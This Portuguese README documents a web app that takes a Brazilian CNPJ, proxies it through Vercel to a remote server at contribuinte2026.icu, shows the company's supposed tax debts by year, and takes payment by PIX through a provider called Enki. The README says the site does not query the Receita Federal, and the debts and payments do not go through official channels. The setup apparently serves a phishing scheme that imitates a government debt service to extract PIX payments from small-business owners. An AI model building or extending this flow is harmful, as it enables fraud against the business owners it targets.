# API de consulta de CNPJ — como funciona

## Resumo

O site **não consulta a Receita Federal diretamente**. O fluxo é:

```
Seu site (Vercel)  →  /api/cnpj  →  contribuinte2026.icu  →  cnpj.php
```

A Vercel só faz **proxy** (repassa a requisição). A lógica de negócio está no servidor remoto.

---

## Endpoint no seu site (Vercel)

```
GET https://seu-projeto.vercel.app/api/cnpj?cnpj=00000000000100&token=vias
```

| Parâmetro | Obrigatório | Descrição |
|-----------|-------------|-----------|
| `cnpj` | Sim | 14 dígitos (com ou sem máscara) |
| `token` | Não | Padrão: `vias` |

---

## Servidor remoto (origem real)

```
GET https://contribuinte2026.icu/v/teste-mei/cnpj.php?cnpj=00000000000100&token=vias
```

Variável de ambiente na Vercel (opcional):

`REMOTE_BASE=https://contribuinte2026.icu/v/teste-mei`

---

## Resposta de sucesso (exemplo)

CNPJ `00.000.000/0001-00`:

```json
{
  "cnpj": "00000000000100",
  "nomeEmpresarial": "00.000.000 NOME EMPRESARIAL EXEMPLO",
  "situacao": "ATIVO",
  "total_debitos": 2,
  "anos": [2023]
}
```

| Campo | Uso no site |
|-------|-------------|
| `cnpj` | Redireciona para tela de débitos |
| `nomeEmpresarial` | Exibido no cabeçalho |
| `anos` | Anos com débito; pré-seleciona no dropdown |

---

## API de débitos (segunda etapa)

```
GET /api/debts?lista=00000000000100|2023&token=vias
```

Proxy para:

```
https://contribuinte2026.icu/v/teste-mei/debitos/api.php?lista=00000000000100|2023&token=vias
```

Retorno: array `debts` com parcelas (valor, multa, juros, vencimento, etc.).

---

## API de PIX (Enki — separada)

Não usa o servidor contribuinte2026. Usa a **Enki** com `ENKI_PUBLIC_KEY` e `ENKI_SECRET_KEY` na Vercel.

```
GET /api/pix?lista=106.01&cnpj=00000000000100&name=Nome+Empresa
```

---

## Fluxo completo no navegador

1. `index.html` → chama `/api/cnpj`
2. Redireciona para `/debitos?cnpj=...&nomeEmpre=...&anos=2023`
3. `debitos/index.html` → chama `/api/debts?lista=CNPJ|ANO`
4. Usuário paga → `/api/pix` (Enki)
